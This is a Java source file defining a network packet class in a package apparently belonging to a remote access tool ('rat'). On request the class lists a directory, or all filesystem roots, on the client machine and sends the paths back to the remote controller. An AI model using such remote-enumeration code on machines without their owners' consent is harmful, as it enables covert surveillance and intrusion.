package de.sogomn.rat.packet;

import java.io.File;
import java.util.ArrayList;
import java.util.stream.Stream;

import de.sogomn.rat.ActiveClient;

public class FileSystemPacket extends AbstractPingPongPacket {
	
	private String rootFile;
	private String[] paths;
	
	private static final byte INCOMING = 0;
	private static final byte END = 1;
	
	public FileSystemPacket(final String rootFile) {
		this.rootFile = rootFile;
		
		type = REQUEST;
		paths = new String[0];
	}
	
	public FileSystemPacket() {
		this("");
		
		type = DATA;
	}
	
	@Override
	protected void sendRequest(final ActiveClient client) {
		client.writeUTF(rootFile);
	}
	
	@Override
	protected void sendData(final ActiveClient client) {
		for (final String path : paths) {
			client.writeByte(INCOMING);
			client.writeUTF(path);
		}
		
		client.writeByte(END);
	}
	
	@Override
	protected void receiveRequest(final ActiveClient client) {
		rootFile = client.readUTF();
	}
	
	@Override
	protected void receiveData(final ActiveClient client) {
		final ArrayList<String> pathList = new ArrayList<String>();
		
		while (client.readByte() == INCOMING) {
			final String path = client.readUTF();
			
			pathList.add(path);
		}
		
		paths = new String[pathList.size()];
		paths = pathList.toArray(paths);
	}
	
	@Override
	protected void executeRequest(final ActiveClient client) {
		final File[] children;
		
		if (!rootFile.isEmpty()) {
			final File file = new File(rootFile);
			
			children = file.listFiles();
		} else {
			children = File.listRoots();
		}
		
		if (children != null) {
			paths = Stream
					.of(children)
					.map(File::getAbsolutePath)
					.toArray(String[]::new);
		}
		
		type = DATA;
		client.addPacket(this);
	}
	
	@Override
	protected void executeData(final ActiveClient client) {
		//...
	}
	
	public String[] getPaths() {
		return paths;
	}
	
}
